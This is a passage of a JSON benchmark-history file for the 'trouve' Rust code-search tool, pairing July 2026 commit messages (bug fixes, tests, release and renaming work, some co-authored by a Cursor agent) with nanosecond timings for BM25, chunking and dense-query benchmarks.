          "message": "Validate store parameters on snapshot open; verify existing files in save (#16)\n\nThe patch fast path opens the newest compatible snapshot regardless of\nmanifest hash (open_latest), but only validated SNAPSHOT_VERSION,\nmodel_id, and content types. STORE_VERSION and DESIRED_CHUNK_LENGTH are\nmixed into the manifest hash (so exact-match loads were safe) but were\nnot recorded in the snapshot itself — a future STORE_VERSION bump\nwithout a matching SNAPSHOT_VERSION bump would have silently spliced\nrows chunked under the old rules into patched indexes, breaking the\npatched-equals-full-rebuild guarantee.\n\nRecord store_version and chunk_len in SnapshotMeta and reject\nmismatches in RawSnapshot::open. Bump the snapshot format to v4\n(SMBLSNP4) since the meta layout changed; old snapshots are discarded\non magic mismatch and rebuilt.\n\nAlso fix save()'s early exit: the snapshot filename truncates the\nmanifest hash to 128 bits, and save() trusted any pre-existing file at\nthat path without verifying its embedded full hash — a partial or\nforeign file would be kept forever and miss on every load. Verify the\nexisting file and rewrite it if it is not actually this snapshot.\n\nThe module doc still described the v2 magic; it now matches the code.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T20:14:54-04:00",
          "tree_id": "aa2fd2a41ad500b180574b14dcf106846ca7b565",
          "url": "https://github.com/jimsimon/trouve/commit/3ffd6848b3649fe9c20668def17396487e7ad869"
        },
        "date": 1783124219207,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4888265.909090909,
            "range": "± 6690",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36957.28734228734,
            "range": "± 32",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3105329.09375,
            "range": "± 1884",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1386176.0267737617,
            "range": "± 8925",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "600ffaa2e2445d200c7048ae841b2093619dfdb2",
          "message": "Report snapshot reuse separately and add the documented cache hit rate (#19)\n\nBuildStats.files_from_store counted every non-recomputed file,\nincluding rows spliced zero-copy out of a previous snapshot — after a\npatch build the stats implied store reads that never happened, and the\nexact-match snapshot load reported the whole manifest as store hits.\nTrack files_from_snapshot separately and only count real store reads\nin files_from_store.\n\nThe stats subcommand help, README, and DIFFERENCES.md all promised a\ncache hit rate that the output never included; trouve stats now emits\ncache_hit_rate (files reused from any cache layer over files_total)\nalongside the per-layer counts.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T20:15:20-04:00",
          "tree_id": "4651f6562da6d13513c1e11e24fcf6b6b588ec85",
          "url": "https://github.com/jimsimon/trouve/commit/600ffaa2e2445d200c7048ae841b2093619dfdb2"
        },
        "date": 1783124342333,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5000658.75,
            "range": "± 7997",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37199.88940329218,
            "range": "± 39",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3038219.2352941176,
            "range": "± 2485",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1382237.3854166667,
            "range": "± 10563",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "81f99b6338ff3eed4521065ee09c7d80d040741e",
          "message": "Docs cleanup: fix inaccuracies found in review (#23)\n\n- README: Go was fully wired (tree-sitter-go dependency and chunk.rs\n  match arm) but missing from the natively-supported language table.\n- README: the cache-location section paired SEMBLE_CLONE_TIMEOUT with\n  TROUVE_CLONE_TTL, but the TTL is trouve-only; the actual pair is\n  TROUVE_CLONE_TIMEOUT (git network timeout, default 60s), which was\n  undocumented. Document both correctly.\n- CHANGELOG: the 1.0.0 installer entry said eleven coding agents; there\n  are 14 (matching the README).\n- BENCHMARKS: the kubernetes warm-query time appeared as both 0.55s and\n  0.54s; use the headline 0.55s consistently.\n- plugin README: the Claude Code section listed raw MCP tool names\n  while Codex showed the harness-prefixed ones; Claude Code also\n  prefixes (mcp__trouve__*).\n- SearchResult/search module docs now state that reranking changes the\n  score scale, so scores are only comparable within one result list.\n- bm25.rs module doc now notes production indexing tokenizes content\n  and path enrichment separately (index::path_enrichment_tokens) and\n  keeps enrich_for_bm25 as the upstream-reference form.\n- manifest.rs documents the mtime+size fast-path staleness caveat for\n  non-git roots (same trade-off as git's stat-based detection).\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T21:29:10-04:00",
          "tree_id": "8fb7a48d27a0c8e395dbdd851e9d94168ed0ff78",
          "url": "https://github.com/jimsimon/trouve/commit/81f99b6338ff3eed4521065ee09c7d80d040741e"
        },
        "date": 1783128675430,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4868656.199999999,
            "range": "± 9863",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36732.088397537766,
            "range": "± 37",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2992053.970588235,
            "range": "± 2325",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1381049.6510416665,
            "range": "± 14219",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "4531a5660d5457b4b8379a1de306b0a15b1132da",
          "message": "Honor .trouveignore in git repositories (#15)\n\n* Honor .trouveignore in git repositories\n\n.trouveignore (and the deprecated .sembleignore) were only consulted by\nthe directory walker, which is used for non-git roots. Git repositories\nbuild their manifest from git ls-files / git status, so the documented\n'exclude from indexing without git-ignoring' behaviour silently did\nnothing in the primary use case.\n\nApply .trouveignore rules (per-directory, gitignore semantics, deepest\nmatch wins) on top of the git file listing, for tracked and untracked\nfiles alike. .gitignore is intentionally not re-applied there: git\nitself decides what is tracked or untracked.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Apply .trouveignore before hashing to avoid wasted I/O\n\nReview feedback: the filter previously ran after dirty tracked files\nand untracked files had already been read and hashed, so excluded\nfiles (e.g. a large generated tree) paid full I/O before being\ndropped. Check the ignore rules in the tracked-file loop before the\ndirty-hash, and pre-filter the untracked list sequentially before the\nparallel hash step (TrouveIgnore caches specs behind &mut self, so it\ncannot be shared across the par_iter).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T21:29:49-04:00",
          "tree_id": "3464dcaf1ad2c48de4a0f5f5c3dff259528ae412",
          "url": "https://github.com/jimsimon/trouve/commit/4531a5660d5457b4b8379a1de306b0a15b1132da"
        },
        "date": 1783128803959,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4854256.454545455,
            "range": "± 10844",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36828.43239883402,
            "range": "± 36",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3010682.676470588,
            "range": "± 3456",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1341104.0014285715,
            "range": "± 9935",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "febd208234caa0db7d972b61cbac0e00b2627403",
          "message": "Handle tracked symlinks and merge conflicts in the git manifest (#17)\n\n* Handle tracked symlinks and merge conflicts in the git manifest\n\nTracked symlinks were keyed by their git blob OID — the hash of the\nlink target *path* — while indexing read straight through the link and\nchunked the target file's content. The store entry would then serve\nstale content whenever the target changed without the link itself\nbecoming dirty. Skip symlinks (mode 120000) like the walker and the\nuntracked path already do, and guard the dirty-file branch against\ntracked files replaced by symlinks in the working tree (typechange).\n\nUnmerged paths appear in git ls-files -s with stage-1/2/3 entries;\nthe first stage listed used to win arbitrarily when the path escaped\nthe dirty set. Treat any stage > 0 as dirty and hash the working tree,\nwhich is what search results would show.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fix unmerged-paths test on CI runners without a git identity\n\ngit merge refuses to start when no committer identity is configured\n(CI runners have no global git config), so the test's merge never\ncreated stage-1/2/3 entries and the file stayed a clean stage-0 blob,\nfailing the b3: content-key assertion. Set the identity env vars like\nthe git() helper does, and assert the conflict precondition explicitly\nso an environment problem fails with a clear message.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Extract git_command test helper to deduplicate identity env setup\n\nReview feedback: the merge invocation duplicated the identity env\nvars already set in the git() helper. Both now build on a shared\ngit_command helper.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T22:38:07-04:00",
          "tree_id": "3acb0e7ae7b5d656f70e188f5a2d7f18c7d868c9",
          "url": "https://github.com/jimsimon/trouve/commit/febd208234caa0db7d972b61cbac0e00b2627403"
        },
        "date": 1783132805690,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4792754.636363637,
            "range": "± 8499",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36915.37893630345,
            "range": "± 22",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2954736.9411764704,
            "range": "± 1113",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1326441.8767131744,
            "range": "± 9875",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "5ba3b9f376a370459e2cfc5e034ebb384b86c0ce",
          "message": "Validate model artifacts at load time; never panic on tokenizer failure (#20)\n\n* Validate model artifacts at load time; never panic on tokenizer failure\n\npool_into slices the embedding table without bounds checks, trusting\nthat every token id resolves to a valid row. That held for intact\nmodel files but a corrupt or mismatched model.safetensors (truncated\ndownload, wrong mapping tensor) would panic mid-index. Validate at\nload instead, keeping the pooling hot path branch-free:\n\n- decode_mapping rejects negative or out-of-range entries (negative\n  i64s previously wrapped to huge u32 row indexes);\n- the vocabulary size must be covered by the mapping tensor (when\n  present) or fit the embedding table (when absent).\n\nThe HF tokenizer fallback path used .expect(\"tokenization failed\"),\nturning any tokenizer error into a process abort — during an index\nbuild that is one bad text killing the whole run. Failed texts now\nembed as the zero vector (BM25 still covers them) with a one-time\nwarning on stderr.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Validate token ids against the highest assigned id, not the vocab count\n\nReview feedback: get_vocab_size(true) counts tokens, but token id\nassignments can have gaps, so an id can exceed the count and still\nindex past the mapping/table with the count-based check. Compute the\nid space as max assigned id + 1 from get_vocab(true) and validate\nmapping length / table rows against that, which bounds every id the\ntokenizer can emit. Verified the real potion-code-16M model still\nloads and passes embed parity.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T22:38:17-04:00",
          "tree_id": "e9a091cf98a813f99c072b829a55f049c4fead77",
          "url": "https://github.com/jimsimon/trouve/commit/5ba3b9f376a370459e2cfc5e034ebb384b86c0ce"
        },
        "date": 1783132929446,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4810088.545454545,
            "range": "± 6581",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37103.988343480465,
            "range": "± 24",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2966385.1176470593,
            "range": "± 2185",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1366434.5661656891,
            "range": "± 11725",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "291d6705cbc26b4d31337f01d17634929c9492c2",
          "message": "Add the model-backed e2e tests that README and CI already promised (#21)\n\n* Add the model-backed e2e tests that README and CI already promised\n\nREADME documents 'TROUVE_E2E=1 cargo test -- --ignored' as the way to\nrun end-to-end tests that download the model, and test.yml has a\ntest-with-model job running exactly that — but there was not a single\n#[ignore] test in the repo and TROUVE_E2E was never read. The CI job\nexecuted zero tests and passed green.\n\nAdd tests/e2e.rs with two ignored tests gated on TROUVE_E2E:\n\n- index a small fixture project with the real default model\n  (potion-code-16M downloaded from the Hugging Face Hub) and verify\n  semantic and identifier queries rank the right files first, plus\n  find_related excludes the seed;\n- a warm rebuild recomputes nothing and returns identical results.\n\nWithout TROUVE_E2E=1 they skip themselves so a plain\n'cargo test -- --ignored' stays offline-safe. Verified locally: both\ntests pass against the downloaded model, and the skip path passes\noffline.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address e2e review feedback: strict gate, stale-cache sweep, top-k assertions\n\n- TROUVE_E2E now requires the documented value 1, so TROUVE_E2E=0 (or\n  false) skips instead of downloading the model.\n- The per-run cache dir must stay isolated (tests assert cold-build\n  stats), but previous runs' dirs are now swept at init so repeated\n  local runs no longer accumulate trouve-e2e-cache-* garbage.\n- Ranking assertions check the expected file appears in the top\n  results instead of pinning exact top-1: this suite is a pipeline\n  sanity gate, exact ranking is covered by the parity/quality\n  harnesses, and a model bump or platform float difference must not\n  flake CI. Verified against the real downloaded model.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Only sweep e2e cache dirs untouched for an hour\n\nReview feedback: the unconditional sweep could remove_dir_all the\nstill-in-use cache of a concurrent e2e run in another process,\ncorrupting its in-flight cold-build assertions. Age-gate the sweep to\ndirs whose mtime is over an hour old — a run takes seconds, so a\nconcurrent process's dir is always fresh while genuinely stale dirs\nfrom earlier runs are still cleaned up. Verified: a 2-hour-old dir is\nremoved, a fresh one survives, and the model-backed tests pass.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:17:38-04:00",
          "tree_id": "7ea0b1f760e71df97f40163ac7c679051d1f7f45",
          "url": "https://github.com/jimsimon/trouve/commit/291d6705cbc26b4d31337f01d17634929c9492c2"
        },
        "date": 1783135181172,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5067241.1,
            "range": "± 12264",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36316.021017316016,
            "range": "± 5",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2799300.9444444445,
            "range": "± 1192",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1496008.954007286,
            "range": "± 7137",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "2bfc1f89ce58e42da0e62533501c57743064622c",
          "message": "Prepare the v1.1.0 release (#24)\n\n* Prepare the v1.0.1 release\n\nBump the crate version to 1.0.1 (Cargo.toml, Cargo.lock) and sync the\nplugin manifests via scripts/sync_versions.py. Promote the Unreleased\nchangelog section to 1.0.1 dated 2026-07-04, and add the entries that\nhad not been recorded yet: the model-backed e2e test suite (#21) under\nAdded, and a Fixed section covering .trouveignore in git repos (#15),\nMCP protocol violations (#18), git manifest symlink/conflict handling\n(#17), snapshot compatibility checks (#16), model-loading validation\n(#20), and cache statistics (#19).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Retarget the release as v1.1.0\n\nThe release adds features (clone cache, new grammars, plugins) and\nraises the MSRV, so a minor bump fits SemVer better than a patch.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:32:52-04:00",
          "tree_id": "ed8f6317b00d2d2ec8023117dfad99d840f0ed26",
          "url": "https://github.com/jimsimon/trouve/commit/2bfc1f89ce58e42da0e62533501c57743064622c"
        },
        "date": 1783136099014,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5149864.199999999,
            "range": "± 13149",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35809.942325457974,
            "range": "± 5",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2691118.2894736845,
            "range": "± 1056",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1587790.0180995474,
            "range": "± 10920",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c91ecc6c314d8864b51eae3288c873ebf258d20e",
          "message": "Update Rust crate hf-hub to 0.5 (#26)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:42:17-04:00",
          "tree_id": "f63dbcac5c01411c09859252cc50bdca7724b877",
          "url": "https://github.com/jimsimon/trouve/commit/c91ecc6c314d8864b51eae3288c873ebf258d20e"
        },
        "date": 1783136666189,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5029117.111111111,
            "range": "± 10520",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37051.01833696442,
            "range": "± 24",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3010857.117647059,
            "range": "± 3443",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1382288.0886235074,
            "range": "± 11259",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "732babd59237621444c19108343716d1ede8116f",
          "message": "Fix Renovate lookup for github-action-benchmark pin (#28)\n\nRenovate resolves the version of a digest-pinned action from the trailing\ncomment. benchmark-action/github-action-benchmark has no 'v1' tag (only a\nv1 branch), so the '# v1' comment made the github-tags lookup fail with\n'Could not determine new digest for update'. Point the comment at the\nreal tag, v1.22.1, which matches the pinned SHA.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:42:56-04:00",
          "tree_id": "57fcaf9d897395b67d7642c212218d9889db4dc8",
          "url": "https://github.com/jimsimon/trouve/commit/732babd59237621444c19108343716d1ede8116f"
        },
        "date": 1783136791379,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5088833.199999999,
            "range": "± 10302",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36295.68930137844,
            "range": "± 7",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2789418.888888889,
            "range": "± 685",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1433904.6365131577,
            "range": "± 7459",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "7004a2a98053e8320d523b48200e278e8ff39370",
          "message": "Update GitHub Actions (#32)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-04T19:26:34-04:00",
          "tree_id": "bba5eb324419f0128078061d0e8f75a54e3ffe48",
          "url": "https://github.com/jimsimon/trouve/commit/7004a2a98053e8320d523b48200e278e8ff39370"
        },
        "date": 1783207719032,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4842014.05,
            "range": "± 12910",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36711.439028275585,
            "range": "± 24",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2982129.1176470593,
            "range": "± 2123",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1371828.8442124736,
            "range": "± 8766",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "53517d96037f6214813ebc5d12c2fa694b717dc2",
          "message": "Update Rust crate safetensors to 0.8 (#29)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-04T19:27:12-04:00",
          "tree_id": "da51fbf85cc8e5598253114f075640587c026113",
          "url": "https://github.com/jimsimon/trouve/commit/53517d96037f6214813ebc5d12c2fa694b717dc2"
        },
        "date": 1783207858748,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4903957.954545455,
            "range": "± 9691",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36854.43462962963,
            "range": "± 36",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2972042.6470588236,
            "range": "± 1207",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1391938.156976744,
            "range": "± 8074",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ec59273899b07e063644005c7ba750af9eafd00a",
          "message": "Rename to trouve-search and ship npm packages under @trouve-ai (#34)\n\n* Rename to trouve-search and ship npm packages under @trouve-ai\n\nThe crate and CLI binary become trouve-search, reserving the bare\ntrouve name for future products. npm distribution moves to an npm\nworkspace under npm/: @trouve-ai/search-core ships the native binary\nvia per-platform optional dependencies plus a Node MCP launcher\n(npx -y @trouve-ai/search-core), and @trouve-ai/search-plugin replaces\ntrouve-plugin, absorbing the Claude/Codex bundle from plugins/trouve.\nRelease and lint workflows, version syncing, and agent docs updated to\nmatch.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Harden release workflow per review: no persisted credentials, npm provenance\n\nDisable persist-credentials on the build and publish-crate checkouts to\nmatch the other jobs, and publish npm packages with --provenance (the\npublish-npm job gets id-token: write for the OIDC-signed attestation).\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Run cargo publish verification before uploading to crates.io\n\nRemove --no-verify so the release workflow builds the crate in Cargo's\nisolated package mode before publishing.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pass the release tag to packaging steps via env\n\nInterpolating github.ref_name directly into the run scripts exposes\ntar/Compress-Archive to tag-name injection; route it through REF_NAME.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Address PR review feedback\n\n- Rename remaining \"trouve\" diagnostics to \"trouve-search\" in the\n  OpenCode tool file and the plugin's server/error messages.\n- platform.js: fail fast on unsupported CPU architectures instead of\n  silently falling back to x64.\n- stage_npm_binaries.py: report missing archive members with the\n  member list instead of an uncaught KeyError.\n- release.yml: pass github.ref_name through env in the package steps\n  to avoid shell template injection via tag names.\n- lint.yml: pin Node and cache the npm workspace via setup-node.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pin actions/setup-node to a commit SHA\n\nPin the two setup-node uses to the v6.4.0 commit with a version\ncomment; Renovate's github-actions manager keeps SHA pins updated.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-05T14:58:52-04:00",
          "tree_id": "3bea8e2df0a49d1f2f54b62888105c53c40517af",
          "url": "https://github.com/jimsimon/trouve/commit/ec59273899b07e063644005c7ba750af9eafd00a"
        },
        "date": 1783278054663,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5088260.300000001,
            "range": "± 10346",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36746.194526680825,
            "range": "± 6",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2809248.4444444445,
            "range": "± 563",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1529519.929078014,
            "range": "± 9123",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "5d92f0950f3b6d01649db5bb135a8129bbad90ce",
          "message": "Add NAME.md explaining the trouve name (#35)\n\n* Add NAME.md documenting the trouve name and its significance\n\nExplains the nod to upstream semble, the literal fit for the search\ntool, and why the find/create etymology of \"trouver\" suits an AI\numbrella brand; README already links to it.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Note deprecated SEMBLE_*/.sembleignore fallbacks in NAME.md\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-05T15:28:23-04:00",
          "tree_id": "7c7554cd8887c34f3c69ce5e779d14fdb481495b",
          "url": "https://github.com/jimsimon/trouve/commit/5d92f0950f3b6d01649db5bb135a8129bbad90ce"
        },
        "date": 1783279824823,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5114487.85,
            "range": "± 12781",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35839.83273622929,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2834609.722222222,
            "range": "± 1045",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1539586.0712067436,
            "range": "± 14178",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "52a77f702d6b42e51ebbbad09f3b797e6872d1e6",
          "message": "Prepare the v2.0.0 release (#37)\n\nBump the crate version to 2.0.0 (Cargo.toml, Cargo.lock) and sync the\nnpm workspace and plugin manifests via scripts/sync_versions.py.\nPromote the Unreleased changelog section to 2.0.0 dated 2026-07-05 —\na major bump because the crate/binary rename to trouve-search and the\nmove to @trouve-ai npm packages break existing installs and MCP\nconfigs — and record the entries not yet captured: NAME.md and the\nhf-hub/tokenizers/safetensors dependency updates.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-05T19:37:07-04:00",
          "tree_id": "80d8fef5fef5cedcf0eb7d60a32e01ea0d5ad0ef",
          "url": "https://github.com/jimsimon/trouve/commit/52a77f702d6b42e51ebbbad09f3b797e6872d1e6"
        },
        "date": 1783294752903,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4887822.454545455,
            "range": "± 9656",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37260.668032972,
            "range": "± 8",
            "unit": "ns"
          },
          {
